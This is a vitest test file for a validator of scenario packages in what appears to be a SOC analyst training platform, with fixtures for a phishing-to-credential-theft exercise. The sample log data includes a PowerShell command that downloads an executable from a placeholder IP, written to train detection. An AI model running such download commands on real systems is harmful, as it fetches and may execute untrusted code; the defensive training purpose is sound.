import { describe, it, expect } from 'vitest';
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { validateScenarios } from '../src/load.js';

function setupOkOperation(dir: string, id: string) {
  const opDir = path.join(dir, 'operations', id);
  mkdirSync(opDir, { recursive: true });
  mkdirSync(path.join(opDir, 'data'), { recursive: true });
  mkdirSync(path.join(opDir, 'steps'), { recursive: true });
  writeFileSync(
    path.join(opDir, 'operation.json'),
    JSON.stringify({
      id,
      title: 'Phishing → Credential Theft',
      summary: 'Initial access from a phish leading to credential theft.',
      difficulty: 'easy',
      duration_minutes: 30,
      xp: 50,
      prerequisites: [],
      mitre_techniques: ['T1566', 'T1078'],
      steps: [
        {
          id: 's1',
          order: 1,
          prompt: 'Triage the inbox alert',
          console_focus: 'siem',
          expected_verdict: 'tp',
          expected_mitre: ['T1566'],
          expected_indicators: ['invoice.exe'],
          hints: [{ after_seconds: 30, text: 'Check the sender domain.' }],
          hints_after_seconds: 30,
          hints_interval_seconds: 30,
          hint_penalty_percent: 10
        }
      ]
    })
  );
  writeFileSync(
    path.join(opDir, 'steps', 's1.json'),
    JSON.stringify({
      id: 's1',
      order: 1,
      prompt: 'Triage the inbox alert',
      console_focus: 'siem',
      hints_after_seconds: 30,
      hints_interval_seconds: 30,
      hint_penalty_percent: 10
    })
  );
  writeFileSync(
    path.join(opDir, 'data', 'alerts.jsonl'),
    JSON.stringify({
      id: 'a1',
      ts: '2025-08-12T12:14:01Z',
      source: 'email',
      severity: 'high',
      title: 'Suspicious attachment',
      description: 'Invoice.exe linked from m1crosoft-secure.com',
      entities: { ips: [], hosts: ['WS01'], users: ['v.rao'], file_hashes: [], domains: [] }
    }) + '\n'
  );
  writeFileSync(
    path.join(opDir, 'data', 'logs.jsonl'),
    JSON.stringify({
      id: 'l1',
      ts: '2025-08-12T12:14:09Z',
      source: 'xdr',
      host: 'WS01',
      user: 'v.rao',
      process: 'powershell.exe',
      pid: 5188,
      suspicious: true,
      suspicion_rule: 'macro-doc-spawn',
      event_type: 'process',
      fields: { command: 'Invoke-WebRequest -Uri https://1.2.3.4/i.exe' },
      entities: { ips: ['1.2.3.4'], hosts: ['WS01'], users: ['v.rao'], file_hashes: [], domains: [] }
    }) + '\n'
  );
  writeFileSync(
    path.join(opDir, 'data', 'ground_truth.json'),
    JSON.stringify({
      steps: [
        {
          step_id: 's1',
          verdict: 'tp',
          mitre: ['T1566'],
          indicators: ['invoice.exe'],
          references: { alert_ids: ['a1'], log_ids: ['l1'] }
        }
      ],
      operation_mitre: ['T1566', 'T1078']
    })
  );
}

describe('validateScenarios', () => {
  it('passes a fully valid operation', async () => {
    const dir = mkdtempSync(path.join(tmpdir(), 'scen-ok-'));
    try {
      setupOkOperation(dir, 'ok-op');
      writeFileSync(
        path.join(dir, 'tracks.json'),
        JSON.stringify({
          tracks: [{ id: 't1', title: 'Track', summary: 'A track.', operation_ids: ['ok-op'], gating: { threshold: 70 } }]
        })
      );
      const result = await validateScenarios(dir);
      expect(result.ok).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('rejects dangling alert id in ground truth', async () => {
    const dir = mkdtempSync(path.join(tmpdir(), 'scen-dangling-'));
    try {
      setupOkOperation(dir, 'bad-op');
      // overwrite ground truth with a bad reference
      writeFileSync(
        path.join(dir, 'operations/bad-op/data/ground_truth.json'),
        JSON.stringify({
          steps: [
            {
              step_id: 's1',
              verdict: 'tp',
              mitre: ['T1566'],
              indicators: ['invoice.exe'],
              references: { alert_ids: ['does-not-exist'], log_ids: [] }
            }
          ],
          operation_mitre: ['T1566']
        })
      );
      const result = await validateScenarios(dir);
      expect(result.ok).toBe(false);
      expect(result.issues.some((i) => i.message.includes('does-not-exist'))).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('rejects unknown MITRE technique id', async () => {
    const dir = mkdtempSync(path.join(tmpdir(), 'scen-mitre-'));
    try {
      setupOkOperation(dir, 'bad-mitre');
      // patch operation.json to introduce a fake mitre id
      const opJson = JSON.parse(
        require('node:fs').readFileSync(
          path.join(dir, 'operations/bad-mitre/operation.json'),
          'utf8'
        )
      );
      opJson.mitre_techniques.push('T99999');
      writeFileSync(
        path.join(dir, 'operations/bad-mitre/operation.json'),
        JSON.stringify(opJson)
      );
      const result = await validateScenarios(dir);
      expect(result.ok).toBe(false);
      expect(result.issues.some((i) => i.message.includes('T99999'))).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('rejects tracks referencing unknown operations', async () => {
    const dir = mkdtempSync(path.join(tmpdir(), 'scen-track-'));
    try {
      setupOkOperation(dir, 'ok-op');
      writeFileSync(
        path.join(dir, 'tracks.json'),
        JSON.stringify({
          tracks: [
            {
              id: 't1',
              title: 'Track',
              summary: 'A track.',
              operation_ids: ['ok-op', 'ghost-op'],
              gating: { threshold: 70 }
            }
          ]
        })
      );
      const result = await validateScenarios(dir);
      expect(result.ok).toBe(false);
      expect(result.issues.some((i) => i.message.includes('ghost-op'))).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
